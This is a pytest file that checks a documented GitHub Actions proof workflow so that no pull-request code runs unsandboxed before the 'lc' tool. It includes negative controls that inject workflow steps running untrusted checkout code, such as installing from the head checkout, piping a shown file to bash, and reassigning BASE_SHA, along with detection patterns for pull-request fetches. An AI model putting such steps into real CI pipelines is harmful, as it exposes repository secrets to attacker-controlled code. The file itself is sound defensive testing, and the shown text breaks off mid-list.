"""The CI proof workflow in ``docs/setup/proof.md`` keeps the pull request's files away from the steps before ``lc``.

Only ``proof-run`` is sandboxed, and only from the moment ``lc`` starts a test. Every step the workflow runs itself
before that runs as the job, so a pull request that reaches one of them runs its code unsandboxed, beside the model key
in ``proof-plan`` and beside the results file in ``proof-run``. ``astral-sh/setup-uv`` reaches the checkout twice over:
its default cache (``auto``, on for hosted runners) runs ``uv python find`` in the working directory, which executes an
interpreter path the repository's ``.python-version`` names, and ``uv`` reads ``required-version`` from the repository's
``uv.toml`` or ``pyproject.toml`` and searches upward from ``--project``. So the example pins ``uv``, turns its cache
off, and checks the pull request out last, into a subdirectory, with ``lc`` pointed at it by ``--repo``.

Every checkout that is not LemonCrow's own is a checkout of the pull request (a bare ``actions/checkout`` on a
``pull_request`` event checks out the merge commit, so it counts too), and nothing may reach its directory except ``lc``
itself and one ``git show`` of a file of the base commit. The base install reads the commit ``lc`` diffs from (the plan's
``base_sha``), not the base branch's tip, or the dependency check would watch a different pair of commits than the one
installed.

Two layers. The rules above name the ways a step can reach the checkout (a path, a directory, a default, a fetch of the
pull request, an indirection through the environment). Under them sits an allowlist of what the page ships: every
``run`` script, every action and every ``${{ }}`` expression of the three jobs, so a step nobody thought of is flagged
too, and a change to a shipped script, or a step removed, is a decision made here, in ``SHIPPED_RUN``, not a side
effect of editing the page.

The tests parse the YAML the page ships, and each rule has a negative control, so a rule that stopped checking would
fail here rather than ship.
"""

from __future__ import annotations

import copy
import posixpath
import re
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[2]
PROOF_DOC = ROOT / "docs" / "setup" / "proof.md"
WORKFLOW_DOC = ROOT / "docs" / "setup" / "github-action.md"
ACTION = ROOT / "action.yml"

JOBS = ("proof-plan", "proof-run", "proof-report")
CLI_DIR = ".lemoncrow-cli"
FULL_SHA = re.compile(r"^[0-9a-f]{40}$")
SEMVER = re.compile(r"^\d+\.\d+\.\d+$")
LC = re.compile(r"\blc review proof (plan|run|report)\b")
LEMONCROW_REPOSITORY = "lemoncrow-lab/lemoncrow"
HEAD_REF = "${{ github.event.pull_request.head.sha }}"
PLAN_ARTIFACT = "lemoncrow-proof-plan"
#: How a step names the workspace (its working directory is the workspace root); stripped with the slashes after it, so
#: ``$GITHUB_WORKSPACE/head``, ``"$PWD"//head`` and ``${GITHUB_WORKSPACE:?}/head`` are all ``head``.
WORKSPACE = re.compile(
    r"""["']?(?:\$\{\{\s*github\.workspace\s*\}\}|\$\{(?:GITHUB_WORKSPACE|PWD)[^}]*\}|\$(?:GITHUB_WORKSPACE|PWD)\b"""
    r"""|\$\(\s*pwd\s*\)|`\s*pwd\s*`)["']?/+"""
)
#: A step that fetches the pull request's code itself: ``gh pr checkout``, or a fetch of ``pull/N/head`` or ``/merge``.
PR_FETCH = re.compile(r"\bgh\s+pr\s+(?:checkout|co)\b|\bpull/(?:\$\{\{.*?\}\}|[^\s/]+)/(?:head|merge)\b")
#: A later write to ``BASE_SHA``: an assignment, an append, ``read``/``declare``/``printf -v`` of it.
ASSIGNS_BASE = re.compile(
    r"\bBASE_SHA\+?=(?!~)|\b(?:read|mapfile|readarray|declare|typeset|printf\s+-v)\b[^\n;&|]*\bBASE_SHA\b"
)
EXPRESSION = re.compile(r"\$\{\{.*?\}\}", re.DOTALL)
#: The only ``${{ }}`` expressions of the jobs (a step cannot name the head checkout through one it builds from others).
EXPRESSIONS = frozenset(
    {
        "${{ github.event.pull_request.head.sha }}",
        "${{ github.event.pull_request.number }}",
        "${{ github.token }}",
        "${{ secrets.ANTHROPIC_API_KEY }}",
        "${{ runner.temp }}",
    }
)
ACTIONS = frozenset(
    {
        "actions/checkout",
        "actions/download-artifact",
        "actions/setup-python",
        "actions/upload-artifact",
        "astral-sh/setup-uv",
    }
)
UV_SYNC = "uv sync --frozen --project .lemoncrow-cli"
#: Every ``run`` script the page ships, whole-line comments dropped, one entry per line. The page's safety rests on
#: these exact scripts: one edited or added, before ``lc`` or after it, is flagged until it is changed here too.
SHIPPED_RUN: dict[str, frozenset[str]] = {
    "proof-plan": frozenset(
        {
            UV_SYNC,
            "uv run --project .lemoncrow-cli lc review proof plan --repo head "
            "--pr ${{ github.event.pull_request.number }} --out lemoncrow-proof-plan.json",
        }
    ),
    "proof-run": frozenset(
        {
            UV_SYNC,
            "sudo apt-get install -y bubblewrap\nsudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0",
            "\n".join(
                [
                    'BASE_SHA=$(jq -r .base_sha "$GITHUB_WORKSPACE/lemoncrow-proof-plan.json")',
                    '[[ "$BASE_SHA" =~ ^[0-9a-f]{40}$ ]] || { echo "the plan names no base commit" >&2; exit 1; }',
                    'git -C "$GITHUB_WORKSPACE/head" show "$BASE_SHA:requirements-dev.txt" > base-req.txt',
                    "python -m venv venv",
                    "venv/bin/pip install --only-binary=:all: -r base-req.txt",
                    'echo "$RUNNER_TEMP/venv/bin" >> "$GITHUB_PATH"',
                ]
            ),
            "uv run --project .lemoncrow-cli lc review proof run --repo head --plan lemoncrow-proof-plan.json "
            '--sandbox bubblewrap --toolchain "$RUNNER_TEMP/venv" --toolchain /opt/hostedtoolcache '
            "--deps-manifest requirements-dev.txt --out lemoncrow-proof-results.json",
        }
    ),
    "proof-report": frozenset(
        {
            UV_SYNC,
            "uv run --project .lemoncrow-cli lc review proof report --plan lemoncrow-proof-plan.json "
            "--results lemoncrow-proof-results.json --report-file lemoncrow-proof-report.json",
        }
    ),
}
#: What separates the words of a command or a value (so ``--prefix=head`` and ``sys.path.insert(0,'head')`` split).
WORDS = re.compile(r"""[\s"'`;&|()<>=,:{}\[\]*?\\]+""")
BASE_FROM_PLAN = re.compile(r'BASE_SHA=\$\(jq -r \.base_sha "\$GITHUB_WORKSPACE/([^"\s]+)"\)')
BASE_SHOW = 'show "$BASE_SHA:'
BASE_CHECK = '[[ "$BASE_SHA" =~ ^[0-9a-f]{40}$ ]]'

Jobs = dict[str, Any]


def _jobs() -> Jobs:
    match = re.search(r"```yaml\n(.*?)\n```", PROOF_DOC.read_text(encoding="utf-8"), re.DOTALL)
    assert match, "docs/setup/proof.md has no yaml block"
    jobs = yaml.safe_load("jobs:\n" + match.group(1))["jobs"]
    assert isinstance(jobs, dict)
    return jobs


def _steps(job: dict[str, Any]) -> list[dict[str, Any]]:
    return [step for step in job["steps"] if isinstance(step, dict)]


def _uses(step: dict[str, Any], action: str) -> bool:
    return str(step.get("uses", "")).startswith(f"{action}@")


def _with(step: dict[str, Any]) -> dict[str, Any]:
    return step.get("with") or {}


def _is_head_checkout(step: dict[str, Any]) -> bool:
    """A checkout of the pull request: any checkout that is not LemonCrow's own (a bare one gets the merge commit)."""

    return _uses(step, "actions/checkout") and str(_with(step).get("repository", "")).strip().lower() != (
        LEMONCROW_REPOSITORY
    )


def _run_text(step: dict[str, Any]) -> str:
    """The step's script on one line, without its whole-line comments (they say what the code does, and run nothing)."""

    return " ".join(re.sub(r"(?m)^[ \t]*#.*$", "", str(step.get("run", ""))).split())


def _script(step: dict[str, Any]) -> str:
    """The step's script with whole-line comments and blank lines dropped and each line's spaces collapsed."""

    lines = (" ".join(line.split()) for line in str(step.get("run", "")).splitlines())
    return "\n".join(line for line in lines if line and not line.startswith("#"))


def _strings(value: object) -> list[str]:
    """Every string in a parsed YAML value, keys included."""

    if isinstance(value, str):
        return [value]
    if isinstance(value, dict):
        return [text for key, item in value.items() for text in (*_strings(key), *_strings(item))]
    if isinstance(value, list):
        return [text for item in value for text in _strings(item)]
    return []


def _norm(path: object) -> str:
    """*path* in workspace-relative normal form: ``''`` for the workspace itself, ``..``-first when it leaves it."""

    text = WORKSPACE.sub("", str(path).strip().strip("\"'"))
    normal = posixpath.normpath(text) if text else "."
    return "" if normal == "." else normal


def _inside(path: str, directory: str) -> bool:
    """Whether the normalised *path* is *directory* or below it."""

    return path == directory or path.startswith(directory + "/")


def _label(step: dict[str, Any]) -> str:
    return str(step.get("name") or step.get("run") or step.get("uses") or "")[:60]


def _reaches(text: str, head_dir: str) -> list[tuple[str, str]]:
    """``(the word before, the word)`` for each word of *text* that names a path inside the head checkout."""

    text = re.sub(r"(?m)^[ \t]*#.*$", "", WORKSPACE.sub("", text))  # whole-line shell comments say nothing
    words = [word for word in WORDS.split(text) if word]
    return [(words[i - 1] if i else "", word) for i, word in enumerate(words) if _inside(_norm(word), head_dir)]


def _values(mapping: object) -> str:
    return " ".join(str(value) for value in mapping.values()) if isinstance(mapping, dict) else ""


def _scope(label: str, scope: dict[str, Any], head_dir: str) -> list[str]:
    """What a job or the workflow sets for every step: the directory ``run`` starts in, and the environment."""

    found: list[str] = []
    defaults = scope.get("defaults")
    run = defaults.get("run") if isinstance(defaults, dict) else None
    where = _norm(run.get("working-directory", "")) if isinstance(run, dict) else ""
    if where and _inside(where, head_dir):
        found.append(f"{label}: defaults to running in the head checkout ({where})")
    for _, word in _reaches(str(run.get("shell", "")) if isinstance(run, dict) else "", head_dir):
        found.append(f"{label}: default shell is in the head checkout ({word})")
    for _, word in _reaches(_values(scope.get("env")), head_dir):
        found.append(f"{label}: env uses the head checkout ({word})")
    return found


def _step_text(step: dict[str, Any], head_dir: str, *, is_lc: bool, job: str) -> str:
    """What the step runs or is given, minus the three places the head checkout is meant to appear."""

    run = str(step.get("run", ""))
    if job == "proof-run":  # the base install only: one file of the base commit, written to a plain file, as data
        run = re.sub(
            rf'git\s+-C\s+"\$GITHUB_WORKSPACE/{re.escape(head_dir)}"\s+show\s+"\$BASE_SHA:[\w./-]+"\s+>\s+[\w.-]+(?=\s|$)',
            "",
            run,
        )
    if is_lc:  # `lc` is pointed at the checkout, and that is the one place it is named
        run = re.sub(r"--repo\s+(\S+)", lambda hit: "" if _norm(hit.group(1)) == head_dir else hit.group(0), run)
    return " ".join([run, _values(_with(step)), _values(step.get("env")), str(step.get("shell", ""))])


def _base_install(name: str, steps: list[dict[str, Any]]) -> list[str]:
    """The file the run installs from the base is the file ``--deps-manifest`` watches, from the commit ``lc`` diffs."""

    found: list[str] = []
    runs = [_run_text(step) for step in steps]
    listed = [m for run in runs for m in re.findall(r"--deps-manifest (\S+)", run)]
    shown = [m for run in runs for m in re.findall(r'show "\$BASE_SHA:([^"]+)"', run)]
    if not listed or set(listed) != set(shown):
        found.append(f"{name}: --deps-manifest {listed} does not match the file installed from the base {shown}")
    plan_args = [m for run in runs if LC.search(run) for m in re.findall(r"--plan (\S+)", run)]
    download = next(
        (
            i
            for i, s in enumerate(steps)
            if _uses(s, "actions/download-artifact") and _with(s).get("name") == PLAN_ARTIFACT
        ),
        len(steps),
    )
    for index, run in enumerate(runs):
        if BASE_SHOW not in run:
            continue
        read = BASE_FROM_PLAN.search(run)
        if not read:
            found.append(
                f"{name}: the base install must read BASE_SHA from the plan "
                '(BASE_SHA=$(jq -r .base_sha "$GITHUB_WORKSPACE/<plan>")): it is the commit lc diffs from'
            )
            continue
        if plan_args and read.group(1) not in plan_args:
            found.append(f"{name}: the base install reads {read.group(1)}, not the plan lc runs with {plan_args}")
        if download > index:
            found.append(f"{name}: the plan is not downloaded before the base install reads it")
        checked = run.find(BASE_CHECK)
        if not read.end() <= checked < run.find(BASE_SHOW):
            found.append(f"{name}: the base install does not validate BASE_SHA as a 40-hex commit before using it")
    if sum(len(ASSIGNS_BASE.findall(run)) for run in runs) > 1 or any(
        "BASE_SHA" in _strings(step.get("env")) for step in steps
    ):
        found.append(
            f"{name}: BASE_SHA is assigned more than once (or set in env): the value that was validated must be the "
            "one the install reads"
        )
    for step in steps:
        if "pull_request.base.sha" in str(step):
            found.append(
                f"{name}: step {_label(step)!r} uses github.event.pull_request.base.sha, the base branch's tip, "
                "which is not the commit lc diffs from (the plan's base_sha)"
            )
    return found


def _shipped(name: str, job: dict[str, Any]) -> list[str]:
    """What the job holds that the page does not ship: a run script, an action or an expression."""

    found: list[str] = []
    scripts = {_script(step) for step in _steps(job) if "run" in step}
    for gone in sorted(SHIPPED_RUN.get(name, frozenset()) - scripts):  # the list goes both ways: a step removed too
        found.append(
            f"{name}: the page no longer ships the run step {gone.splitlines()[0][:60]!r} that SHIPPED_RUN lists "
            "(a removed step is a change to the page's safety argument: update the list with it)"
        )
    for step in _steps(job):
        if "run" in step and _script(step) not in SHIPPED_RUN.get(name, frozenset()):
            found.append(
                f"{name}: step {_label(step)!r} is not a run step the page ships (SHIPPED_RUN lists them: a script "
                "added or edited, before lc or after it, runs as the job, outside the sandbox)"
            )
        action = str(step.get("uses", "")).split("@", 1)[0].strip()
        if action and action not in ACTIONS:
            found.append(f"{name}: step {_label(step)!r} uses {action}, an action the page does not ship")
    for expression in dict.fromkeys(hit for text in _strings(job) for hit in EXPRESSION.findall(text)):
        if " ".join(expression.split()) not in EXPRESSIONS:
            found.append(
                f"{name}: {expression} is an expression the page does not use (one can build a path of the head "
                "checkout out of others)"
            )
    return found


def violations(jobs: Jobs, workflow: dict[str, Any] | None = None) -> list[str]:
    """Every way ``jobs`` (in *workflow*) lets the pull request reach a step that runs as the job (empty when none)."""

    found: list[str] = []
    head_dirs: list[str] = []
    for name in JOBS:
        if name not in jobs:
            found.append(f"{name}: the job is missing")
            continue
        steps = _steps(jobs[name])
        # 0. Nothing but what the page ships; and no step fetches the pull request's code itself.
        found += _shipped(name, jobs[name])
        for step in steps:
            if PR_FETCH.search(_run_text(step)):
                found.append(
                    f"{name}: step {_label(step)!r} fetches the pull request's code itself (gh pr checkout, or a "
                    "fetch of pull/N/head): the head checkout is the one place it comes from"
                )
        # 1. Every uv install: pinned action, pinned uv, no cache.
        for step in steps:
            if not _uses(step, "astral-sh/setup-uv"):
                continue
            if not FULL_SHA.match(str(step["uses"]).split("@", 1)[1].split()[0]):
                found.append(f"{name}: setup-uv is not pinned to a full commit sha")
            options = _with(step)
            if options.get("enable-cache") is not False:
                found.append(
                    f"{name}: setup-uv must set enable-cache: false (its default runs uv in the working directory)"
                )
            version = options.get("version")
            if not (isinstance(version, str) and SEMVER.match(version)):
                found.append(f"{name}: setup-uv must pin version to one release, not {version!r}")
        # 2. The CLI is checked out once, into its own directory; the pull request (any other checkout) once, at its
        #    head, into a subdirectory, and not at all in the report job.
        heads = [step for step in steps if _is_head_checkout(step)]
        clis = [step for step in steps if _uses(step, "actions/checkout") and not _is_head_checkout(step)]
        if len(clis) != 1 or _norm(_with(clis[0]).get("path", "")) != CLI_DIR:
            found.append(f"{name}: expected one checkout of the LemonCrow CLI, into {CLI_DIR}, found {len(clis)}")
        if name == "proof-report":
            if heads:
                found.append(f"{name}: must check out nothing from the pull request")
            continue
        if len(heads) != 1:
            found.append(f"{name}: expected one checkout of the pull request's head, found {len(heads)}")
            continue
        head = heads[0]
        if re.sub(r"\s+", "", str(_with(head).get("ref", ""))) != re.sub(r"\s+", "", HEAD_REF):
            found.append(
                f"{name}: the pull request checkout must use ref: {HEAD_REF}, not {_with(head).get('ref')!r} "
                "(the default is the merge commit)"
            )
        head_dir = _norm(_with(head).get("path", ""))
        if not head_dir or head_dir.startswith(("/", "..")):
            found.append(f"{name}: the head checkout must go into its own subdirectory, not path {head_dir!r}")
            continue
        head_dirs.append(head_dir)
        for step in clis:
            other = _norm(_with(step).get("path", ""))
            if _inside(other, head_dir) or _inside(head_dir, other):
                found.append(f"{name}: the checkout at {other!r} overlaps the head checkout at {head_dir!r}")
        # 3. No step runs in, or names a path of, the head checkout: the one `git show` of a base file and `--repo`
        #    aside, `lc` is the only thing that opens it. Job-level defaults and environment count for every step.
        found += _scope(name, jobs[name], head_dir)
        lc_index = next((i for i, step in enumerate(steps) if LC.search(_run_text(step))), -1)
        for index, step in enumerate(steps):
            if step is head:
                continue
            label = _label(step)
            where = _norm(step.get("working-directory", ""))
            if where and _inside(where, head_dir):
                found.append(f"{name}: step {label!r} runs in the head checkout")
            local = str(step.get("uses", ""))
            if local.startswith((".", "/")) and _inside(_norm(local), head_dir):
                found.append(f"{name}: step {label!r} runs an action from the head checkout")
            for before, word in _reaches(_step_text(step, head_dir, is_lc=index == lc_index, job=name), head_dir):
                verb = "changes into" if before in {"cd", "pushd"} else "uses"
                found.append(f"{name}: step {label!r} {verb} the head checkout ({word})")
        for step in steps:
            for call in re.findall(r"\buv (?:sync|run)\b[^;&|]*", _run_text(step)):
                if f"--project {CLI_DIR}" not in call:
                    found.append(f"{name}: `{call.strip()}` does not name --project {CLI_DIR}")
        # 4. `lc` is pointed at the head checkout.
        for step in steps:
            command = _run_text(step)
            hit = LC.search(command)
            if hit and hit.group(1) in {"plan", "run"}:
                repo = re.search(r"--repo (\S+)", command)
                if not repo or _norm(repo.group(1)) != head_dir:
                    found.append(f"{name}: `lc review proof {hit.group(1)}` must pass --repo {head_dir}")
            if hit and hit.group(1) == "plan" and ("--pr " not in command or "--state-file" in command):
                found.append(
                    f"{name}: `lc review proof plan` must read the pull request with --pr, not a --state-file: "
                    "only then is its base commit checked against the base branch"
                )
    for head_dir in dict.fromkeys(head_dirs):
        found += _scope("workflow", workflow or {}, head_dir)
    # 5. What the run installs from the base: the file --deps-manifest watches, from the commit lc diffs from.
    if "proof-run" in jobs:
        found += _base_install("proof-run", _steps(jobs["proof-run"]))
    return list(dict.fromkeys(found))


def _workflow() -> dict[str, Any]:
    """The workflow the page tells the reader to add the jobs to (the one on the GitHub Action page)."""

    match = re.search(r"```yaml\n(.*?)\n```", WORKFLOW_DOC.read_text(encoding="utf-8"), re.DOTALL)
    assert match, "docs/setup/github-action.md has no yaml block"
    workflow = yaml.safe_load(match.group(1))
    assert isinstance(workflow, dict) and "jobs" in workflow
    return workflow


def test_the_workflow_in_the_page_lets_the_pull_request_reach_no_step_before_lc() -> None:
    assert violations(_jobs(), _workflow()) == []


def test_the_rules_are_not_vacuous() -> None:
    jobs = _jobs()
    setups = [step for job in JOBS for step in _steps(jobs[job]) if _uses(step, "astral-sh/setup-uv")]
    heads = [step for job in JOBS for step in _steps(jobs[job]) if _is_head_checkout(step)]
    clis = [
        step
        for job in JOBS
        for step in _steps(jobs[job])
        if _uses(step, "actions/checkout") and not _is_head_checkout(step)
    ]
    assert len(setups) == 3
    assert len(heads) == 2
    assert {str(_with(step)["path"]) for step in heads} == {"head"}
    assert [str(_with(step)["path"]) for step in clis] == [CLI_DIR] * 3
    assert _workflow().get("defaults") is None  # the page's workflow sets no default directory for its steps


def test_the_page_pins_the_same_uv_as_the_action() -> None:
    steps = yaml.safe_load(ACTION.read_text(encoding="utf-8"))["runs"]["steps"]
    action = next(step for step in steps if _uses(step, "astral-sh/setup-uv"))
    jobs = _jobs()
    for job in JOBS:
        page = next(step for step in _steps(jobs[job]) if _uses(step, "astral-sh/setup-uv"))
        assert str(page["uses"]).split()[0] == str(action["uses"]).split()[0]
        assert _with(page)["version"] == _with(action)["version"]


# ---- negative controls: each way back to running the pull request's code before lc ------------------------------- #


def _setup_uv(job: str) -> Callable[[Jobs], dict[str, Any]]:
    return lambda jobs: next(step for step in _steps(jobs[job]) if _uses(step, "astral-sh/setup-uv"))


def _head(job: str) -> Callable[[Jobs], dict[str, Any]]:
    return lambda jobs: next(step for step in _steps(jobs[job]) if _is_head_checkout(step))


def _drop(job: str, key: str) -> Callable[[Jobs], None]:
    return lambda jobs: _with(_setup_uv(job)(jobs)).pop(key)


def _set(job: str, key: str, value: Any) -> Callable[[Jobs], None]:
    return lambda jobs: _with(_setup_uv(job)(jobs)).__setitem__(key, value)


def _replace(job: str, old: str, new: str) -> Callable[[Jobs], None]:
    def mutate(jobs: Jobs) -> None:
        step = next(step for step in _steps(jobs[job]) if old in str(step.get("run", "")))
        step["run"] = step["run"].replace(old, new)

    return mutate


def _insert_before_lc(job: str, step: dict[str, Any]) -> Callable[[Jobs], None]:
    def mutate(jobs: Jobs) -> None:
        steps = jobs[job]["steps"]
        steps.insert(next(i for i, item in enumerate(steps) if LC.search(_run_text(item))), step)

    return mutate


def _insert_first(job: str, step: dict[str, Any]) -> Callable[[Jobs], None]:
    return lambda jobs: jobs[job]["steps"].insert(0, copy.deepcopy(step))


def _append(job: str, step: dict[str, Any]) -> Callable[[Jobs], None]:
    return lambda jobs: jobs[job]["steps"].append(copy.deepcopy(step))


def _step_with(job: str, text: str) -> Callable[[Jobs], dict[str, Any]]:
    return lambda jobs: next(step for step in _steps(jobs[job]) if text in str(step.get("run", "")))


CHECKOUT = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
SETUP_PYTHON = "actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065"
PLAN_BASE = 'BASE_SHA=$(jq -r .base_sha "$GITHUB_WORKSPACE/lemoncrow-proof-plan.json")'
SHA_CHECK = '[[ "$BASE_SHA" =~ ^[0-9a-f]{40}$ ]] || { echo "the plan names no base commit" >&2; exit 1; }'
#: Ways a step before ``lc`` can install from, build in or change into the pull request's checkout.
INTO_HEAD = [
    "pip install -r head/requirements-dev.txt",
    "pip install ./head",
    "pip install head/",
    "pip install -e head[dev]",
    "npm --prefix head ci",
    "npm --prefix=head ci",
    "make -C head deps",
    "pushd head",
    "uv pip install -r head/requirements-dev.txt",
    "uvx --from ./head tool",
    'pip install -r "$GITHUB_WORKSPACE/head/requirements-dev.txt"',
    "pip install -r ${GITHUB_WORKSPACE}/head/requirements-dev.txt",
    "pip install -r ${{ github.workspace }}/head/requirements-dev.txt",
    "pip install -r ./x/../head/requirements-dev.txt",
    "pip install -r $PWD/head/requirements-dev.txt",
    "pip install -r ${PWD}/head/requirements-dev.txt",
    'pip install -r "$(pwd)/head/requirements-dev.txt"',
    "pip install -r `pwd`/head/requirements-dev.txt",
    "pip install -r ${GITHUB_WORKSPACE:?}/head/requirements-dev.txt",
    "pip install -r ${GITHUB_WORKSPACE:-.}/head/requirements-dev.txt",
    "pip install -r $GITHUB_WORKSPACE//head/requirements-dev.txt",
    "pip install -r ${{ github.workspace }}//head/requirements-dev.txt",
    "PYTHONPATH=head python -c pass",
    "python -c \"import sys; sys.path.insert(0, 'head')\"",
    "(cd head && make)",
]


def _old_base_install(jobs: Jobs) -> None:
    """The install of the page before this rule: BASE_SHA from the base branch's tip, in env."""

    step = _step_with("proof-run", BASE_SHOW)(jobs)
    step["env"] = {"BASE_SHA": "${{ github.event.pull_request.base.sha }}"}
    step["run"] = "\n".join(
        line
        for line in step["run"].splitlines()
        if "BASE_SHA=" not in line and "=~" not in line and not line.lstrip().startswith("#")
    )


def _validate_after_use(jobs: Jobs) -> None:
    step = _step_with("proof-run", BASE_SHOW)(jobs)
    step["run"] = step["run"].replace(SHA_CHECK + "\n", "") + SHA_CHECK + "\n"


def _download_after_install(jobs: Jobs) -> None:
    steps = jobs["proof-run"]["steps"]
    download = next(step for step in steps if _uses(step, "actions/download-artifact"))
    steps.remove(download)
    steps.insert(next(i for i, step in enumerate(steps) if BASE_SHOW in str(step.get("run", ""))) + 1, download)


MUTATIONS: list[tuple[str, Callable[[Jobs], None], str]] = [
    ("plan: cache left at its default", _drop("proof-plan", "enable-cache"), "enable-cache: false"),
    ("run: cache turned on", _set("proof-run", "enable-cache", True), "enable-cache: false"),
    ("report: cache turned on", _set("proof-report", "enable-cache", "auto"), "enable-cache: false"),
    ("plan: no version", _drop("proof-plan", "version"), "pin version"),
    ("run: latest", _set("proof-run", "version", "latest"), "pin version"),
    ("report: a range", _set("proof-report", "version", "0.11"), "pin version"),
    (
        "run: a tag instead of a sha",
        lambda jobs: _setup_uv("proof-run")(jobs).__setitem__("uses", "astral-sh/setup-uv@v5"),
        "full commit sha",
    ),
    (
        "plan: the head goes into the workspace root",
        lambda jobs: _with(_head("proof-plan")(jobs)).pop("path"),
        "its own subdirectory",
    ),
    (
        "run: the head goes into '.'",
        lambda jobs: _with(_head("proof-run")(jobs)).__setitem__("path", "."),
        "its own subdirectory",
    ),
    (
        "run: the head goes outside the workspace",
        lambda jobs: _with(_head("proof-run")(jobs)).__setitem__("path", "../head"),
        "its own subdirectory",
    ),
    (
        "run: the CLI is nested in the head checkout",
        lambda jobs: _with(
            next(s for s in _steps(jobs["proof-run"]) if _uses(s, "actions/checkout") and not _is_head_checkout(s))
        ).__setitem__("path", "head/.lemoncrow-cli"),
        "overlaps",
    ),
    (
        "plan: a step runs in the head checkout before lc",
        _insert_before_lc("proof-plan", {"name": "Install", "working-directory": "head", "run": "make deps"}),
        "runs in the head checkout",
    ),
    (
        "run: a step runs in the head checkout by workspace path",
        _insert_before_lc("proof-run", {"working-directory": "${{ github.workspace }}/head/sub", "run": "npm ci"}),
        "runs in the head checkout",
    ),
    (
        "run: a step changes into the head checkout",
        _insert_before_lc("proof-run", {"run": "cd head && pip install -r requirements-dev.txt"}),
        "changes into the head checkout",
    ),
    ("plan: lc is not pointed at the head", _replace("proof-plan", " --repo head", ""), "--repo head"),
    ("run: lc is pointed somewhere else", _replace("proof-run", "--repo head", "--repo ."), "--repo head"),
    (
        "run: uv sync without the CLI project",
        _replace("proof-run", "uv sync --frozen --project .lemoncrow-cli", "uv sync --frozen"),
        "--project .lemoncrow-cli",
    ),
    (
        "plan: uv run without the CLI project",
        _replace("proof-plan", "uv run --project .lemoncrow-cli", "uv run"),
        "--project .lemoncrow-cli",
    ),
    (
        "report: the report job checks the pull request out",
        lambda jobs: jobs["proof-report"]["steps"].insert(
            0,
            {
                "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
                "with": {"ref": "${{ github.event.pull_request.head.sha }}"},
            },
        ),
        "check out nothing from the pull request",
    ),
    (
        "run: the watched manifest is not the installed one",
        _replace("proof-run", "--deps-manifest requirements-dev.txt", "--deps-manifest other.txt"),
        "--deps-manifest",
    ),
    (
        "run: no watched manifest",
        _replace("proof-run", "--deps-manifest requirements-dev.txt ", ""),
        "--deps-manifest",
    ),
    # -- a checkout of the pull request that is not the head sha in its own directory ------------------------------ #
    (
        "plan: a bare checkout comes first (it gets the merge commit)",
        _insert_first("proof-plan", {"uses": CHECKOUT}),
        "expected one checkout of the pull request",
    ),
    (
        "run: a bare checkout comes first",
        _insert_first("proof-run", {"uses": CHECKOUT, "with": {"persist-credentials": False}}),
        "expected one checkout of the pull request",
    ),
    (
        "report: a bare checkout comes first",
        _insert_first("proof-report", {"uses": CHECKOUT}),
        "check out nothing from the pull request",
    ),
    (
        "report: a checkout of the pull request's repository by name",
        _insert_first("proof-report", {"uses": CHECKOUT, "with": {"repository": "${{ github.repository }}"}}),
        "check out nothing from the pull request",
    ),
    (
        "plan: the head checkout loses its ref",
        lambda jobs: _with(_head("proof-plan")(jobs)).pop("ref"),
        "github.event.pull_request.head.sha",
    ),
    (
        "run: the head checkout takes the merge commit",
        lambda jobs: _with(_head("proof-run")(jobs)).__setitem__(
            "ref", "${{ github.event.pull_request.merge_commit_sha }}"
        ),
        "github.event.pull_request.head.sha",
    ),
    (
        "run: the head checkout takes the base",
        lambda jobs: _with(_head("proof-run")(jobs)).__setitem__("ref", "${{ github.event.pull_request.base.sha }}"),
        "github.event.pull_request.head.sha",
    ),
    (
        "plan: the CLI is checked out twice",
        _insert_first(
            "proof-plan", {"uses": CHECKOUT, "with": {"repository": "lemoncrow-lab/lemoncrow", "path": "cli2"}}
        ),
        "expected one checkout of the LemonCrow CLI",
    ),
    (
        "run: the CLI goes into the workspace root",
        lambda jobs: _with(
            next(s for s in _steps(jobs["proof-run"]) if _uses(s, "actions/checkout") and not _is_head_checkout(s))
        ).pop("path"),
        "expected one checkout of the LemonCrow CLI",
    ),
    # -- the directory a step, a job or the workflow runs in ------------------------------------------------------- #
    (
        "plan: working-directory ./head",
        _insert_before_lc("proof-plan", {"name": "Install", "working-directory": "./head", "run": "make deps"}),
        "runs in the head checkout",
    ),
    (
        "run: working-directory head/../head/sub",
        _insert_before_lc("proof-run", {"working-directory": "head/../head/sub", "run": "npm ci"}),
        "runs in the head checkout",
    ),
    (
        "run: working-directory $GITHUB_WORKSPACE/head",
        _insert_before_lc("proof-run", {"working-directory": "$GITHUB_WORKSPACE/head", "run": "npm ci"}),
        "runs in the head checkout",
    ),
    (
        "run: a step after lc runs in the head checkout",
        _append("proof-run", {"working-directory": "head", "run": "make clean"}),
        "runs in the head checkout",
    ),
    (
        "plan: the job's default directory is the head checkout",
        lambda jobs: jobs["proof-plan"].__setitem__("defaults", {"run": {"working-directory": "head"}}),
        "defaults to running in the head checkout",
    ),
    (
        "run: the job's default directory is ./head",
        lambda jobs: jobs["proof-run"].__setitem__("defaults", {"run": {"working-directory": "./head"}}),
        "defaults to running in the head checkout",
    ),
    (
        "run: the job's environment names the head checkout",
        lambda jobs: jobs["proof-run"].__setitem__("env", {"PYTHONPATH": "head"}),
        "env uses the head checkout",
    ),
    # -- the exempt `git show`, and the one place it is allowed -------------------------------------------------- #
    (
        "plan: BASE_SHA is the head, shown, then installed from",
        _insert_before_lc(
            "proof-plan",
            {
                "run": "\n".join(
                    [
                        "BASE_SHA=${{ github.event.pull_request.head.sha }}",
                        'git -C "$GITHUB_WORKSPACE/head" show "$BASE_SHA:r.txt" > r.txt',
                        "pip install -r r.txt",
                    ]
                )
            },
        ),
        "the head checkout",
    ),
    (
        "run: another step shows a head file to a plain file",
        _insert_before_lc(
            "proof-run",
            {"run": 'git -C "$GITHUB_WORKSPACE/head" show "$BASE_SHA:build.sh" > build.sh && bash build.sh'},
        ),
        "not a run step the page ships",
    ),
    (
        "run: the shown file is piped to a shell",
        _replace("proof-run", "> base-req.txt", "| bash"),
        "the head checkout",
    ),
    (
        "run: the shown file is written into the head checkout",
        _replace("proof-run", "> base-req.txt", "> head/base-req.txt"),
        "the head checkout",
    ),
    (
        "run: BASE_SHA is reassigned to the head after the check",
        _replace("proof-run", SHA_CHECK, SHA_CHECK + "\nBASE_SHA=${{ github.event.pull_request.head.sha }}"),
